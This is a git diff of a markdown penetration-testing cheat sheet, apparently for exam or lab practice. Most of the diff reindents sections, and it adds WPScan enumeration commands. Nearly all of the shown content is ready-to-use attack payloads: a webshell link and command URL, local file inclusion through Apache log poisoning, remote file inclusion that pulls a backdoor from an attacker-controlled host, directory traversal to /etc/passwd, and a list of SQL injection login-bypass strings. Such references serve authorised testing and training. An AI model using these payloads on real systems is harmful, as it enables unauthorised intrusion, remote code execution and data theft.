@@ -244,74 +244,84 @@ feroxbuster -u http://<target> -w <wordlist>
 <details>
   <summary><strong>File Inclusions</strong></summary>
 
-  ### webshells
-  https://github.com/tennc/webshell/tree/master/fuzzdb-webshell
+### webshells
+https://github.com/tennc/webshell/tree/master/fuzzdb-webshell
 
-  ### Webshell
-  ```bash
-  http://<target>/webshell.php?cmd=id
-  ```
+### Webshell
+```bash
+http://<target>/webshell.php?cmd=id
+```
 
-  ### Local File Inclusion
-  ```bash
-  http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
-  ```
+### Local File Inclusion
+```bash
+http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+```
 
-  ### Remote File Inlcusion
-  ```bash
-  http://<target>/index.php?page=http://<attacker-ip>/simple-backdoor.php&cmd=ls
-  ```
+### Remote File Inlcusion
+```bash
+http://<target>/index.php?page=http://<attacker-ip>/simple-backdoor.php&cmd=ls
+```
 
 </details>
 
 <details>
   <summary><strong>Directory Traversal</strong></summary>
 
-  ### Linux
-  ```bash
-  http://<target>/index.php?page=../../../../../../../../../etc/passwd
-  ```
+### Linux
+```bash
+http://<target>/index.php?page=../../../../../../../../../etc/passwd
+```
 
-  ### Windows
-  ```bash
-  http://<target>/public/plugins/alertlist/../../../../../../../../Users/install.txt
-  ```
+### Windows
+```bash
+http://<target>/public/plugins/alertlist/../../../../../../../../Users/install.txt
+```
 
 </details>
 
 <details>
   <summary><strong>SQL Injection</strong></summary>
 
-  ```bash
-  admin' or '1'='1
-  ' or '1'='1
-  " or "1"="1
-  " or "1"="1"--
-  " or "1"="1"/*
-  " or "1"="1"#
-  " or 1=1
-  " or 1=1 --
-  " or 1=1 -
-  " or 1=1--
-  " or 1=1/*
-  " or 1=1#
-  " or 1=1-
-  ") or "1"="1
-  ") or "1"="1"--
-  ") or "1"="1"/*
-  ") or "1"="1"#
-  ") or ("1"="1
-  ") or ("1"="1"--
-  ") or ("1"="1"/*
-  ") or ("1"="1"#
-  ) or '1`='1-
-  ```
+```bash
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+```
 
 </details>
 
 <details> <summary><strong>CMS</strong></summary>
 
 ## WordPress
+
+### WPScan – Basic Scan
+```bash
+wpscan --url http://<target> --verbose
+```
+
+### WPScan – Enumeration Scan
+```bash
+wpscan --url http://<target> --enumerate vp,u,vt,tt --follow-redirection --verbose
+```
 
 ## Joomla
 
